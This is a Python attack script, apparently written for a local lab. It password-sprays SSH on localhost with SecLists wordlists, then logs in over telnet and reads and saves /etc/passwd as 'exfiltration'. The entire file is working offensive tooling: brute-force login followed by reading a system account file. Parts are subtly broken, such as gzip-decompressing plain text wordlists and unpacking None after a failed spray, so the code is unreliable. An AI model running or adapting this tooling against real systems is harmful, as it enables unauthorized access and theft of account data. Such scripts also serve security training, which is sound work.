from pwn import *
import paramiko
import requests
import shutil
import gzip
import telnetlib

# Download the common passwords file
def download_file(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_filename

def connect_passw_spray(host, port, timeout, url_username, url_password):
    attempts = 0
    user_file = download_file(url_username)
    pass_file = download_file(url_password)
    print("*** Attempts ***")
    #Decompress the file and read line per line
    user_list = gzip.open(user_file, "rb")
    pass_list = gzip.open(pass_file, "rb")
    for user in user_list:
        username  = user.decode("utf-8").strip("\n")
        # Reset the password iterator for every username
        pass_list.seek(0)
        for passw in pass_list:
            password  = passw.decode("utf-8").strip("\n")
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
                client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    look_for_keys=False,
                    allow_agent=False
                )
                print("[{}] Valid credentials found: '{}, {}'".format(attempts, username, password))
                return client, username, password
            except paramiko.ssh_exception.AuthenticationException:
                print("[{}] Invalid credentials: '{}, {}'".format(attempts, username, password))
            except paramiko.ssh_exception.SSHException:
                print("[{}] Connection closed".format(attempts))
            except Exception as e:
                print(e)
            attempts += 1
    print("Password spray failed")
    return None, None, None

def connect_telnet(username, password):
    print("*** Telnet Connection ***")
    host = "127.0.0.1"
    port = 2223

    try:
        tn = telnetlib.Telnet(host, port, timeout=10)
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        
        # Vérifiez si un prompt est retourné après le login
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        if "$" in response or "~$" in response:
            print("Telnet connection successful.")
            return tn
        else:
            print("Login failed.")
            return None
    except Exception as e:
        print(f"Telnet error: {e}")
        return None

def exfiltrate_files_telnet(tn):
    print("*** Exfiltrating /etc/passwd via Telnet ***")
    try:
        # Envoyer la commande pour lire le fichier
        tn.write(b"cat /etc/passwd\n")
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        
        # Sauvegarder le contenu localement
        with open("exfiltrated_passwd_telnet.txt", "w") as f:
            f.write(response)
        
        print("Exfiltration complete. Content saved to exfiltrated_passwd_telnet.txt")
    except Exception as e:
        print(f"Error during file exfiltration: {e}")

def ssh_attack():
    host = "127.0.0.1"
    port = 2222
    timeout = None
    url_user = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt"
    url_pass = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/top-passwords-shortlist.txt"
    client, username, password = connect_passw_spray(host, port, timeout, url_user, url_pass)
    if client is None :
        return
    try:
        shell = client.invoke_shell()
        time.sleep(1)
        shell.send('ls -a\n')
        print(shell.recv(4096).decode('utf-8'))
    except Exception as e:
        print(e)
    finally:
        client.close()
    return username, password

def telnet_attack(username, password):
    # Connect to Telnet
    telnet_client = connect_telnet(username, password)
    if telnet_client:
        # Exfiltrate files via Telnet
        exfiltrate_files_telnet(telnet_client)

        # Close the Telnet connection
        telnet_client.close()

def main():
    #fist attack
    username, password = ssh_attack()
    #second attack
    telnet_attack(username, password)

if __name__ == "__main__":
    main()
    
